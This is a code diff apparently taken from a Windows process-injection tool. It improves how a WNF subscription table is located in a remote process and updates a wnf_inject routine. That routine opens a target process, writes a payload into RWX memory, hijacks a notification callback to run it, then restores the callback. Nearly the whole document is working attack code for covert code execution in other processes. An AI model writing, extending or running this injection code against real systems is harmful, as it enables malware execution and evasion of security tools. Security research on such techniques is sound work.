@@ -133,7 +133,9 @@ LPVOID FindWnfSubTable(
     return sa;
 }
 
-LPVOID GetUserSubFromProcess(
+// this method searches all writeable areas of memory for the WNF table
+// much slower than version searching data segment
+LPVOID GetUserSubFromProcessOld(
   HANDLE hp, PWNF_USER_SUBSCRIPTION us, ULONG64 sn) 
 {
     SYSTEM_INFO              si;
@@ -165,6 +167,116 @@ LPVOID GetUserSubFromProcess(
     return sa;
 }
 
+LPVOID GetModuleHandleRemote(DWORD pid, LPCWSTR lpModuleName) {
+    HANDLE        ss;
+    MODULEENTRY32 me;
+    LPVOID        ba = NULL;
+    
+    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    
+    if(ss == INVALID_HANDLE_VALUE) return NULL;
+    
+    me.dwSize = sizeof(MODULEENTRY32);
+    
+    if(Module32First(ss, &me)) {
+      do {
+        if(me.th32ProcessID == pid) {
+          if(lstrcmpi(me.szModule, lpModuleName)==0) {
+            ba = me.modBaseAddr;
+            break;
+          }
+        }
+      } while(Module32Next(ss, &me));
+    }
+    CloseHandle(ss);
+    return ba;
+}
+
+// Relative Virtual Address to Virtual Address
+#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)
+
+LPVOID GetUserSubFromProcess(
+  HANDLE hp, DWORD pid, PWNF_USER_SUBSCRIPTION us, ULONG64 sn)
+{
+    LPVOID                   ntdll, sa = NULL;
+    PIMAGE_DOS_HEADER        dos;
+    PIMAGE_NT_HEADERS        nt;
+    PIMAGE_SECTION_HEADER    sh;
+    DWORD                    i, j, res, rva = 0;
+    LPBYTE                   ds;
+    MEMORY_BASIC_INFORMATION mbi;
+    PWNF_SUBSCRIPTION_TABLE  tbl;
+    ULONG_PTR                ptr;
+    SIZE_T                   rd;
+    WNF_SUBSCRIPTION_TABLE   st;
+    
+    // Storage Protection Windows Runtime automatically subscribes to WNF. 
+    // Loading efswrt.dll will create the table if not already initialized.
+    // Search the data segment of NTDLL and obtain the Relative Virtual Address of WNF table
+    // Read the base address of NTDLL from remote process and add to RVA
+    // Read pointer to heap in remote process.
+    // Finally, read a user subscription
+    LoadLibrary(L"efswrt.dll");
+    // get local RVA of subscription table
+    ntdll = GetModuleHandle(L"ntdll.dll");
+
+    dos = (PIMAGE_DOS_HEADER)ntdll;  
+    nt  = RVA2VA(PIMAGE_NT_HEADERS, ntdll, dos->e_lfanew);  
+    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
+            nt->FileHeader.SizeOfOptionalHeader);
+             
+    // scan all writeable segments
+    for(i=0; i<nt->FileHeader.NumberOfSections && rva == 0; i++) {
+      // if this section is writeable, assume it's data
+      if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+        // scan section for pointers to the heap
+        ds = RVA2VA(PBYTE, ntdll, sh[i].VirtualAddress);
+         
+        for(j = 0; 
+            j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
+            j += sizeof(ULONG_PTR)) 
+        {
+          // get pointer
+          ptr = *(ULONG_PTR*)&ds[j];
+          // query the memory
+          res = VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
+          if(res != sizeof(mbi)) continue;
+          
+          // if it's a pointer to heap or stack..
+          if ((mbi.State   == MEM_COMMIT    ) &&
+              (mbi.Type    == MEM_PRIVATE   ) && 
+              (mbi.Protect == PAGE_READWRITE))
+          {
+            tbl = (PWNF_SUBSCRIPTION_TABLE)ptr;
+            // if it looks like subscription table resides here
+            if(tbl->Header.NodeTypeCode == WNF_NODE_SUBSCRIPTION_TABLE && 
+               tbl->Header.NodeByteSize == sizeof(WNF_SUBSCRIPTION_TABLE)) 
+            {
+              // save the Relative Virtual Address
+              rva = (DWORD)(sh[i].VirtualAddress + j);
+              break;
+            }
+          }
+        }
+      }
+    }
+    // we found table locally?
+    if(rva != 0) {
+      // get base address of NTDLL in remote process
+      ntdll = GetModuleHandleRemote(pid, L"ntdll.dll");
+      if(ntdll != NULL) {
+        // read the heap pointer from remote process
+        ReadProcessMemory(
+          hp, (PBYTE)ntdll + rva, &ptr,
+          sizeof(ULONG_PTR), &rd);
+          
+        // read a user subscription from remote
+        sa = GetUserSubFromTable(hp, (LPVOID)ptr, us, sn);
+      }
+    }
+    return sa;
+}
+    
 VOID wnf_inject(LPVOID payload, DWORD payloadSize) {
     WNF_USER_SUBSCRIPTION  us;
     LPVOID                 sa, cs;
@@ -182,8 +294,8 @@ VOID wnf_inject(LPVOID payload, DWORD payloadSize) {
     hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     
     // 2. Locate user subscription
-    sa = GetUserSubFromProcess(hp, &us, WNF_SHEL_APPLICATION_STARTED);
-
+    sa = GetUserSubFromProcess(hp, pid, &us, WNF_SHEL_APPLICATION_STARTED);
+    
     // 3. Allocate RWX memory and write payload
     cs = VirtualAllocEx(hp, NULL, payloadSize,
         MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -203,7 +315,10 @@ VOID wnf_inject(LPVOID payload, DWORD payloadSize) {
       
     _NtUpdateWnfStateData(
       &ns, NULL, 0, 0, NULL, 0, 0);
-      
+    
+    // 
+    Sleep(0);
+    
     // 5. Restore original callback, free memory and close process
     WriteProcessMemory(
       hp, 
@@ -211,6 +326,7 @@ VOID wnf_inject(LPVOID payload, DWORD payloadSize) {
       &us.Callback,
       sizeof(ULONG_PTR),
       &wr);
+    
     VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
     CloseHandle(hp);
 }
